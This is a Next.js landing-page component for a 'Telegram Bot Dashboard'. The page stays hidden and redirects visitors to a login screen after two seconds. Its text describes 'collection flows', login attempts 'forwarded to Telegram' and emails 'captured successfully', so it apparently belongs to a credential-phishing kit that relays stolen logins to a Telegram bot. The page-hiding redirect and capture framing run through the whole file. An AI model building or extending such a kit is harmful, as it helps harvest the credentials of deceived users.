"use client";
import React, { useEffect } from "react";
import Link from "next/link";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";

const Page = () => {
  const router = useRouter();

  useEffect(() => {
    setTimeout(() => {
      document.body.classList.remove("hidden");
      router.push("/auth/login");
    }, 2000);
  }, [router]);

  return (
    <main className="min-h-screen hidden bg-white text-white">
      <div className="mx-auto flex min-h-screen max-w-5xl flex-col px-4 py-6 sm:py-8">
        <header className="flex items-center justify-between">
          <Link href="/" className="flex items-center gap-2">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-sky-500/10 ring-1 ring-sky-500/40">
              <span className="text-lg font-semibold text-sky-400">TG</span>
            </div>
            <span className="text-sm font-medium text-slate-200">
              Telegram Bot Dashboard
            </span>
          </Link>
          <nav className="flex items-center gap-4 text-sm text-slate-300">
            <Link href="/" className="hover:text-white">
              Home
            </Link>
            <Link href="/about" className="hover:text-white">
              About
            </Link>
            <Link href="/dashboard" className="hover:text-white">
              Dashboard
            </Link>
            <Link href="/auth/login">
              <Button size="sm" className="ml-1">
                Login
              </Button>
            </Link>
          </nav>
        </header>

        <section className="mt-16 grid flex-1 gap-10 md:grid-cols-[minmax(0,1.3fr)_minmax(0,1fr)] md:items-center">
          <div className="space-y-6">
            <p className="inline-flex items-center rounded-full border border-sky-500/30 bg-sky-500/10 px-3 py-1 text-xs font-medium text-sky-300">
              Secure forms b7 Telegram delivery
            </p>
            <h1 className="text-4xl font-semibold tracking-tight sm:text-5xl">
              A clean landing for your Telegram-powered login flow.
            </h1>
            <p className="max-w-xl text-sm text-slate-300 sm:text-base">
              Use this project as the front door to your verification or
              collection flows. Guide users to a focused login screen and keep
              everything connected to your Telegram bot in one place.
            </p>
            <div className="flex flex-wrap gap-3">
              <Link href="/auth/login">
                <Button size="lg" className="px-6">
                  Login to continue
                </Button>
              </Link>
              <Link href="/dashboard">
                <Button
                  size="lg"
                  variant="outline"
                  className="border-slate-600 bg-transparent text-slate-100 hover:bg-slate-800"
                >
                  View dummy dashboard
                </Button>
              </Link>
            </div>
            <dl className="mt-6 grid max-w-md grid-cols-3 gap-4 text-xs text-slate-300 sm:text-sm">
              <div>
                <dt className="text-slate-400">Framework</dt>
                <dd className="mt-1 text-base font-semibold text-white">
                  Next.js
                </dd>
              </div>
              <div>
                <dt className="text-slate-400">Styling</dt>
                <dd className="mt-1 text-base font-semibold text-white">
                  Tailwind
                </dd>
              </div>
              <div>
                <dt className="text-slate-400">UI</dt>
                <dd className="mt-1 text-base font-semibold text-white">
                  Shadcn
                </dd>
              </div>
            </dl>
          </div>

          <div className="rounded-2xl border border-slate-800 bg-slate-900/60 p-5 shadow-lg shadow-sky-500/10">
            <div className="mb-4 flex items-center justify-between">
              <p className="text-xs font-medium uppercase tracking-[0.16em] text-slate-400">
                Recent activity
              </p>
              <span className="rounded-full bg-emerald-500/10 px-2 py-0.5 text-[10px] font-semibold text-emerald-300 ring-1 ring-emerald-500/40">
                Live
              </span>
            </div>
            <div className="space-y-3 text-xs text-slate-200">
              <div className="flex items-center justify-between rounded-lg bg-slate-900 px-3 py-2">
                <div>
                  <p className="font-medium">Login attempt</p>
                  <p className="text-[11px] text-slate-400">
                    From an anonymized IP, forwarded to Telegram
                  </p>
                </div>
                <span className="text-[11px] text-slate-500">Just now</span>
              </div>
              <div className="flex items-center justify-between rounded-lg bg-slate-900 px-3 py-2">
                <div>
                  <p className="font-medium">New submission</p>
                  <p className="text-[11px] text-slate-400">
                    Email and metadata captured successfully
                  </p>
                </div>
                <span className="text-[11px] text-slate-500">2 min ago</span>
              </div>
              <div className="flex items-center justify-between rounded-lg bg-slate-900 px-3 py-2">
                <div>
                  <p className="font-medium">Bot status</p>
                  <p className="text-[11px] text-slate-400">
                    Connected to Telegram API
                  </p>
                </div>
                <span className="text-[11px] text-emerald-400">Healthy</span>
              </div>
            </div>
          </div>
        </section>
      </div>
    </main>
  );
};

export default Page;
